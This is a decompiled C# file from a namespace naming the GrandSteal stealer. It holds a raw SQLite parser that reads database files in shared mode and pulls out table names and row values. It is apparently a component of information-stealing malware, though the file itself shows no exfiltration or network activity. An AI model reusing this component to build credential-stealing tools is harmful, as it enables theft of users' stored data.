﻿using System;
using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace GrandSteal.Client.Data.SQLite
{
	// Token: 0x02000003 RID: 3
	public class SQLiteManager
	{
		// Token: 0x17000003 RID: 3
		// (get) Token: 0x06000007 RID: 7 RVA: 0x000020A3 File Offset: 0x000002A3
		private byte[] DataArray { get; }

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x06000008 RID: 8 RVA: 0x000020AB File Offset: 0x000002AB
		private ulong DataEncoding { get; }

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x06000009 RID: 9 RVA: 0x000020B3 File Offset: 0x000002B3
		// (set) Token: 0x0600000A RID: 10 RVA: 0x000020BB File Offset: 0x000002BB
		public string[] Fields { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x0600000B RID: 11 RVA: 0x000020C4 File Offset: 0x000002C4
		private ushort PageSize { get; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x0600000C RID: 12 RVA: 0x000020CC File Offset: 0x000002CC
		// (set) Token: 0x0600000D RID: 13 RVA: 0x000020D4 File Offset: 0x000002D4
		private MasterEntry[] MasterEntries { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x0600000E RID: 14 RVA: 0x000020DD File Offset: 0x000002DD
		// (set) Token: 0x0600000F RID: 15 RVA: 0x000020E5 File Offset: 0x000002E5
		private DataRow[] DataRows { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000010 RID: 16 RVA: 0x000020EE File Offset: 0x000002EE
		private byte[] SQLDataTypeSize { get; }

		// Token: 0x06000011 RID: 17 RVA: 0x00002718 File Offset: 0x00000918
		public SQLiteManager(string baseName)
		{
			this.SQLDataTypeSize = new byte[]
			{
				0,
				1,
				2,
				3,
				4,
				6,
				8,
				8,
				0,
				0
			};
			if (File.Exists(baseName))
			{
				FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
				string s = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref s, -1L, false);
				FileSystem.FileClose(new int[]
				{
					1
				});
				this.DataArray = Encoding.Default.GetBytes(s);
				if (Encoding.Default.GetString(this.DataArray, 0, 15).CompareTo("SQLite format 3") != 0)
				{
					throw new Exception("");
				}
				if (this.DataArray[52] != 0)
				{
					throw new Exception("");
				}
				this.PageSize = (ushort)this.ConvertToInteger(16, 2);
				this.DataEncoding = this.ConvertToInteger(56, 4);
				if (decimal.Compare(new decimal(this.DataEncoding), 0m) == 0)
				{
					this.DataEncoding = 1L;
				}
				this.ReadMasterTable(100UL);
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000020F6 File Offset: 0x000002F6
		public int GetRowCount()
		{
			return this.DataRows.Length;
		}

		// Token: 0x06000013 RID: 19 RVA: 0x0000281C File Offset: 0x00000A1C
		public string[] GetTableNames()
		{
			string[] array = null;
			int num = 0;
			int num2 = this.MasterEntries.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (this.MasterEntries[i].ItemType == "table")
				{
					array = (string[])Utils.CopyArray(array, new string[num + 1]);
					array[num] = this.MasterEntries[i].ItemName;
					num++;
				}
			}
			return array;
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002100 File Offset: 0x00000300
		public string GetValue(int row_num, int field)
		{
			if (row_num >= this.DataRows.Length)
			{
				return null;
			}
			if (field >= this.DataRows[row_num].Content.Length)
			{
				return null;
			}
			return this.DataRows[row_num].Content[field];
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002890 File Offset: 0x00000A90
		public string GetValue(int row_num, string field)
		{
			int num = -1;
			int num2 = this.Fields.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (this.Fields[i].ToLower().Trim().CompareTo(field.ToLower().Trim()) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return null;
			}
			return this.GetValue(row_num, num);
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000028EC File Offset: 0x00000AEC
		public bool ReadTable(string TableName)
		{
			int num = -1;
			int num2 = this.MasterEntries.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (this.MasterEntries[i].ItemName.ToLower().CompareTo(TableName.ToLower()) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return false;
			}
			string[] array = this.MasterEntries[num].SqlStatement.Substring(this.MasterEntries[num].SqlStatement.IndexOf("(") + 1).Split(new char[]
			{
				','
			});
			int num3 = array.Length - 1;
			for (int j = 0; j <= num3; j++)
			{
				array[j] = array[j].TrimStart(new char[0]);
				int num4 = array[j].IndexOf(" ");
				if (num4 > 0)
				{
					array[j] = array[j].Substring(0, num4);
				}
				if (array[j].IndexOf("UNIQUE") == 0)
				{
					break;
				}
				this.Fields = (string[])Utils.CopyArray(this.Fields, new string[j + 1]);
				this.Fields[j] = array[j];
			}
			return this.ReadTableFromOffset((ulong)((this.MasterEntries[num].RootNum - 1L) * (long)((ulong)this.PageSize)));
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002A38 File Offset: 0x00000C38
		private ulong ConvertToInteger(int startIndex, int Size)
		{
			if (Size > 8 | Size == 0)
			{
				return 0UL;
			}
			ulong num = 0UL;
			int num2 = Size - 1;
			for (int i = 0; i <= num2; i++)
			{
				num = (num << 8 | (ulong)this.DataArray[startIndex + i]);
			}
			return num;
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002A78 File Offset: 0x00000C78
		private long CVL(int startIndex, int endIndex)
		{
			endIndex++;
			byte[] array = new byte[8];
			int num = endIndex - startIndex;
			bool flag = false;
			if (num == 0 | num > 9)
			{
				return 0L;
			}
			if (num == 1)
			{
				array[0] = (this.DataArray[startIndex] & 127);
				return BitConverter.ToInt64(array, 0);
			}
			if (num == 9)
			{
				flag = true;
			}
			int num2 = 1;
			int num3 = 7;
			int num4 = 0;
			if (flag)
			{
				array[0] = this.DataArray[endIndex - 1];
				endIndex--;
				num4 = 1;
			}
			for (int i = endIndex - 1; i >= startIndex; i += -1)
			{
				if (i - 1 >= startIndex)
				{
					array[num4] = (byte)(((int)((byte)(this.DataArray[i] >> (num2 - 1 & 7))) & 255 >> num2) | (int)((byte)(this.DataArray[i - 1] << (num3 & 7))));
					num2++;
					num4++;
					num3--;
				}
				else if (!flag)
				{
					array[num4] = (byte)((int)((byte)(this.DataArray[i] >> (num2 - 1 & 7))) & 255 >> num2);
				}
			}
			return BitConverter.ToInt64(array, 0);
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002B80 File Offset: 0x00000D80
		private int GVL(int startIndex)
		{
			if (startIndex > this.DataArray.Length)
			{
				return 0;
			}
			int num = startIndex + 8;
			for (int i = startIndex; i <= num; i++)
			{
				if (i > this.DataArray.Length - 1)
				{
					return 0;
				}
				if ((this.DataArray[i] & 128) != 128)
				{
					return i;
				}
			}
			return startIndex + 8;
		}

		// Token: 0x0600001A RID: 26 RVA: 0x0000213A File Offset: 0x0000033A
		public static bool IsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002BD4 File Offset: 0x00000DD4
		private void ReadMasterTable(ulong Offset)
		{
			if (this.DataArray[(int)Offset] == 13)
			{
				ushort num = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				int num2 = 0;
				if (this.MasterEntries != null)
				{
					num2 = this.MasterEntries.Length;
					this.MasterEntries = (MasterEntry[])Utils.CopyArray(this.MasterEntries, new MasterEntry[this.MasterEntries.Length + (int)num + 1]);
				}
				else
				{
					this.MasterEntries = new MasterEntry[(int)(num + 1)];
				}
				int num3 = (int)num;
				for (int i = 0; i <= num3; i++)
				{
					ulong num4 = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8m), new decimal(i * 2))), 2);
					if (decimal.Compare(new decimal(Offset), 100m) != 0)
					{
						num4 += Offset;
					}
					int num5 = this.GVL((int)num4);
					this.CVL((int)num4, num5);
					int num6 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					this.MasterEntries[num2 + i].RowID = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
					num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
					num5 = this.GVL((int)num4);
					num6 = num5;
					long value = this.CVL((int)num4, num5);
					long[] array = new long[5];
					int num7 = 0;
					do
					{
						num5 = num6 + 1;
						num6 = this.GVL(num5);
						array[num7] = this.CVL(num5, num6);
						if (array[num7] > 9L)
						{
							if (SQLiteManager.IsOdd(array[num7]))
							{
								array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
							}
							else
							{
								array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
							}
						}
						else
						{
							array[num7] = (long)((ulong)this.SQLDataTypeSize[(int)array[num7]]);
						}
						num7++;
					}
					while (num7 <= 4);
					if (decimal.Compare(new decimal(this.DataEncoding), 1m) == 0)
					{
						this.MasterEntries[num2 + i].ItemType = Encoding.Default.GetString(this.DataArray, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					else if (decimal.Compare(new decimal(this.DataEncoding), 2m) == 0)
					{
						this.MasterEntries[num2 + i].ItemType = Encoding.Unicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					else if (decimal.Compare(new decimal(this.DataEncoding), 3m) == 0)
					{
						this.MasterEntries[num2 + i].ItemType = Encoding.BigEndianUnicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					if (decimal.Compare(new decimal(this.DataEncoding), 1m) == 0)
					{
						this.MasterEntries[num2 + i].ItemName = Encoding.Default.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(this.DataEncoding), 2m) == 0)
					{
						this.MasterEntries[num2 + i].ItemName = Encoding.Unicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(this.DataEncoding), 3m) == 0)
					{
						this.MasterEntries[num2 + i].ItemName = Encoding.BigEndianUnicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					this.MasterEntries[num2 + i].RootNum = (long)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
					if (decimal.Compare(new decimal(this.DataEncoding), 1m) == 0)
					{
						this.MasterEntries[num2 + i].SqlStatement = Encoding.Default.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
					else if (decimal.Compare(new decimal(this.DataEncoding), 2m) == 0)
					{
						this.MasterEntries[num2 + i].SqlStatement = Encoding.Unicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
					else if (decimal.Compare(new decimal(this.DataEncoding), 3m) == 0)
					{
						this.MasterEntries[num2 + i].SqlStatement = Encoding.BigEndianUnicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
				}
				return;
			}
			if (this.DataArray[(int)Offset] == 5)
			{
				int num8 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				for (int j = 0; j <= num8; j++)
				{
					ushort num9 = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(j * 2))), 2);
					if (decimal.Compare(new decimal(Offset), 100m) == 0)
					{
						this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)num9, 4)), 1m), new decimal((int)this.PageSize))));
					}
					else
					{
						this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + (ulong)num9), 4)), 1m), new decimal((int)this.PageSize))));
					}
				}
				this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.PageSize))));
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x000033FC File Offset: 0x000015FC
		private bool ReadTableFromOffset(ulong Offset)
		{
			if (this.DataArray[(int)Offset] == 13)
			{
				int num = Convert.ToInt32(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				int num2 = 0;
				if (this.DataRows != null)
				{
					num2 = this.DataRows.Length;
					this.DataRows = (DataRow[])Utils.CopyArray(this.DataRows, new DataRow[this.DataRows.Length + num + 1]);
				}
				else
				{
					this.DataRows = new DataRow[num + 1];
				}
				int num3 = num;
				for (int i = 0; i <= num3; i++)
				{
					FieldHeader[] array = null;
					ulong num4 = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8m), new decimal(i * 2))), 2);
					if (decimal.Compare(new decimal(Offset), 100m) != 0)
					{
						num4 += Offset;
					}
					int num5 = this.GVL((int)num4);
					this.CVL((int)num4, num5);
					int num6 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					this.DataRows[num2 + i].RowID = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
					num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
					num5 = this.GVL((int)num4);
					num6 = num5;
					long num7 = this.CVL((int)num4, num5);
					long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
					int num9 = 0;
					while (num8 < num7)
					{
						array = (FieldHeader[])Utils.CopyArray(array, new FieldHeader[num9 + 1]);
						num5 = num6 + 1;
						num6 = this.GVL(num5);
						array[num9].Type = this.CVL(num5, num6);
						if (array[num9].Type > 9L)
						{
							if (SQLiteManager.IsOdd(array[num9].Type))
							{
								array[num9].Size = (long)Math.Round((double)(array[num9].Type - 13L) / 2.0);
							}
							else
							{
								array[num9].Size = (long)Math.Round((double)(array[num9].Type - 12L) / 2.0);
							}
						}
						else
						{
							array[num9].Size = (long)((ulong)this.SQLDataTypeSize[(int)array[num9].Type]);
						}
						num8 = num8 + (long)(num6 - num5) + 1L;
						num9++;
					}
					this.DataRows[num2 + i].Content = new string[array.Length - 1 + 1];
					int num10 = 0;
					int num11 = array.Length - 1;
					for (int j = 0; j <= num11; j++)
					{
						if (array[j].Type > 9L)
						{
							if (!SQLiteManager.IsOdd(array[j].Type))
							{
								if (decimal.Compare(new decimal(this.DataEncoding), 1m) == 0)
								{
									this.DataRows[num2 + i].Content[j] = Encoding.Default.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
								else if (decimal.Compare(new decimal(this.DataEncoding), 2m) == 0)
								{
									this.DataRows[num2 + i].Content[j] = Encoding.Unicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
								else if (decimal.Compare(new decimal(this.DataEncoding), 3m) == 0)
								{
									this.DataRows[num2 + i].Content[j] = Encoding.BigEndianUnicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
							}
							else
							{
								this.DataRows[num2 + i].Content[j] = Encoding.Default.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
							}
						}
						else
						{
							this.DataRows[num2 + i].Content[j] = Convert.ToString(this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size));
						}
						num10 += (int)array[j].Size;
					}
				}
			}
			else if (this.DataArray[(int)Offset] == 5)
			{
				int num12 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				for (int k = 0; k <= num12; k++)
				{
					ushort num13 = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(k * 2))), 2);
					this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + (ulong)num13), 4)), 1m), new decimal((int)this.PageSize))));
				}
				this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.PageSize))));
			}
			return true;
		}
	}
}
